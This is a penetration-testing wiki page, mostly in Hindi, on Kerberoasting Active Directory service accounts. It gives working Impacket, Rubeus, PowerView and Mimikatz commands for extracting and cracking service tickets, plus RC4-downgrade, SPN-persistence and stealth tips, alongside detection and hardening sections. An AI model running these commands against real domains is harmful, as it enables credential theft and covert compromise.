# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting का उद्देश्य TGS टिकट्स प्राप्त करना है, खासकर वे जो Active Directory (AD) में user accounts के तहत चलने वाली सेवाओं से संबंधित होते हैं और computer accounts को शामिल नहीं करते। इन टिकट्स का एन्क्रिप्शन उन कुंजियों से होता है जो user पासवर्ड से उत्पन्न होती हैं, जिससे ऑफ़लाइन क्रेडेंशियल क्रैकिंग संभव हो जाती है। किसी user खाते का सेवा के रूप में उपयोग यह दर्शाता है कि ServicePrincipalName (SPN) प्रॉपर्टी खाली नहीं है।

कोई भी authenticated domain user TGS टिकट्स का request कर सकता है, इसलिए किसी विशेष privileges की आवश्यकता नहीं होती।

### Key Points

- लक्षित करता है TGS टिकट्स को उन सेवाओं के लिए जो user accounts के तहत चलती हैं (यानी, जिन खातों में SPN सेट है; computer accounts नहीं)।
- टिकट्स को सर्विस अकाउंट के पासवर्ड से व्युत्पन्न की गई कुंजी से एन्क्रिप्ट किया जाता है और इन्हें ऑफ़लाइन क्रैक किया जा सकता है।
- किसी ऊँचे privilege की आवश्यकता नहीं; कोई भी authenticated account TGS टिकट्स का request कर सकता है।

> [!WARNING]
> अधिकांश सार्वजनिक टूल RC4-HMAC (etype 23) service tickets का अनुरोध करना पसंद करते हैं क्योंकि उन्हें AES की तुलना में क्रैक करना तेज़ होता है। RC4 TGS हैश `$krb5tgs$23$*` से शुरू होते हैं, AES128 `$krb5tgs$17$*` से, और AES256 `$krb5tgs$18$*` से। फिर भी, कई वातावरण AES-only की ओर बढ़ रहे हैं। केवल RC4 को ही प्रासंगिक मानने से बचें।
> साथ ही, “spray-and-pray” roasting से बचें। Rubeus’ default kerberoast सभी SPNs के लिए query और ticket request कर सकता है और यह noisy होता है। पहले रोचक principals को enumerate और target करें।

### Service account secrets & Kerberos crypto cost

बहुत सी सेवाएँ अब भी hand-managed passwords वाले user accounts के तहत चलती हैं। KDC उन पासवर्ड्स से व्युत्पन्न कुंजियों के साथ service tickets को एन्क्रिप्ट करता है और ciphertext किसी भी authenticated principal को दे देता है, इसलिए kerberoasting lockouts या DC telemetry के बिना अनलिमिटेड ऑफ़लाइन अनुमान देता है। एन्क्रिप्शन मोड क्रैकिंग बजट निर्धारित करता है:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4 का confounder केवल keystream को randomize करता है; यह प्रति-guess कोई अतिरिक्त काम नहीं जोड़ता। जब तक service accounts random secrets (gMSA/dMSA, machine accounts, या vault-managed strings) पर निर्भर नहीं करते, compromise की गति पूरी तरह GPU बजट पर निर्भर है। AES-only etypes लागू करने से billion-guesses-per-second डाउनग्रेड हट जाता है, लेकिन कमजोर human passwords फिर भी PBKDF2 के सामने गिर जाते हैं।

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast जाँचों सहित बहु-फ़ीचर टूल्स:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable उपयोगकर्ताओं को सूचीबद्ध करें
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS के लिए अनुरोध करें और memory से dump करें
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- तकनीक 2: स्वचालित उपकरण
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS अनुरोध Windows Security Event 4769 उत्पन्न करता है (Kerberos सेवा टिकट के लिए अनुरोध किया गया था)।

### OPSEC और केवल AES वाले वातावरण

- AES न होने वाले खातों के लिए जानबूझकर RC4 अनुरोध करें:
- Rubeus: `/rc4opsec` tgtdeleg का उपयोग करके AES बिना वाले खातों को सूचीबद्ध करता है और RC4 सेवा टिकट अनुरोध करता है।
- Rubeus: `/tgtdeleg` kerberoast के साथ भी जहाँ संभव हो RC4 अनुरोध ट्रिगर करता है।
- चुपचाप विफल होने के बजाय AES-केवल खातों को Roast करें:
- Rubeus: `/aes` AES सक्षम खातों को सूचीबद्ध करता है और AES सेवा टिकट (etype 17/18) अनुरोध करता है।
- यदि आपके पास पहले से TGT (PTT या .kirbi से) मौजूद है, तो आप `/ticket:<blob|path>` को `/spn:<SPN>` या `/spns:<file>` के साथ उपयोग करके LDAP छोड़ सकते हैं।
- टार्गेटिंग, थ्रॉटलिंग और कम शोर:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` और `/jitter:<1-100>` का उपयोग करें।
- संभावित कमजोर पासवर्ड फ़िल्टर करने के लिए `/pwdsetbefore:<MM-dd-yyyy>` (पुराने पासवर्ड) का उपयोग करें या विशेषाधिकार वाली OUs को लक्षित करने के लिए `/ou:<DN>`।

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

यदि आप किसी खाते को नियंत्रित करते हैं या उसे संशोधित कर सकते हैं, तो आप उसे kerberoastable बनाने के लिए एक SPN जोड़ सकते हैं:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
किसी अकाउंट को डाउनग्रेड करें ताकि RC4 सक्षम हो और cracking आसान हो (लक्ष्य ऑब्जेक्ट पर write privileges की आवश्यकता होती है):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll over a user (अस्थायी SPN)

जब BloodHound यह दिखाता है कि आपके पास किसी user object पर नियंत्रण है (उदा., GenericWrite/GenericAll), तो आप उस विशेष user को विश्वसनीय रूप से “targeted-roast” कर सकते हैं भले ही उसके पास वर्तमान में कोई SPNs न हों:

- नियंत्रित user में उसे roastable बनाने के लिए एक अस्थायी SPN जोड़ें।
- उस SPN के लिए RC4 (etype 23) से एन्क्रिप्टेड TGS-REP का अनुरोध करें ताकि cracking को अनुकूल बनाया जा सके।
- hashcat के साथ `$krb5tgs$23$...` hash को crack करें।
- footprint कम करने के लिए SPN को साफ करें।

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py स्वचालित रूप से add SPN -> request TGS (etype 23) -> remove SPN करता है):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
आउटपुट को hashcat autodetect (mode 13100 for `$krb5tgs$23$`) के साथ Crack करें:
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (कुछ डिस्ट्रीब्यूशन्स पर अप्रचलित)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> आपको users की एक सूची प्रदान करनी होगी क्योंकि valid credentials के बिना आप इस तकनीक से LDAP क्वेरी नहीं कर सकते।

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
संबंधित

यदि आप AS-REP roastable उपयोगकर्ताओं को लक्षित कर रहे हैं, तो यह भी देखें:

{{#ref}}
asreproast.md
{{#endref}}

### पहचान

Kerberoasting चुपके से किया जा सकता है। DCs से Event ID 4769 के लिए खोजें और शोर कम करने के लिए फ़िल्टर लागू करें:

- सर्विस नाम `krbtgt` और `$` पर समाप्त होने वाले सर्विस नाम (कंप्यूटर खाते) को बाहर करें।
- मशीन खातों (`*$$@*`) से आने वाले अनुरोधों को बाहर करें।
- सिर्फ़ सफल अनुरोध (Failure Code `0x0`)।
- एन्क्रिप्शन प्रकार ट्रैक करें: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)। केवल `0x17` पर ही अलर्ट न करें।

PowerShell जाँच का उदाहरण:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
अतिरिक्त विचार:

- प्रति host/user सामान्य SPN उपयोग का बेसलाइन बनाएँ; एक ही principal से आने वाले कई अलग SPN अनुरोधों में बड़े उछाल पर अलर्ट करें।
- AES-hardened domains में असामान्य RC4 उपयोग को चिन्हित करें।

### निवारण / हार्डनिंग

- सेवाओं के लिए gMSA/dMSA या machine accounts का उपयोग करें। Managed accounts के पास 120+ कैरेक्टर के यादृच्छिक पासवर्ड होते हैं और वे स्वचालित रूप से रोटेट होते हैं, जिससे offline cracking व्यावहारिक रूप से असंभव हो जाता है।
- service accounts पर AES लागू करने के लिए `msDS-SupportedEncryptionTypes` को AES-only (decimal 24 / hex 0x18) पर सेट करें और फिर पासवर्ड रोटेट करें ताकि AES keys व्युत्पन्न हों।
- यदि संभव हो, अपने environment में RC4 को अक्षम करें और RC4 उपयोग के प्रयासों की निगरानी करें। DCs पर आप `DefaultDomainSupportedEncTypes` registry value का उपयोग कर सकते हैं उन खातों के लिए डिफ़ॉल्ट निर्देशित करने के लिए जिन पर `msDS-SupportedEncryptionTypes` सेट नहीं है। पूरी तरह से परीक्षण करें।
- user accounts से अनावश्यक SPNs हटाएँ।
- यदि managed accounts व्यावहारिक नहीं हैं तो लंबे, यादृच्छिक service account पासवर्ड (25+ chars) उपयोग करें; सामान्य पासवर्ड पर प्रतिबंध लगाएँ और नियमित रूप से ऑडिट करें।

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
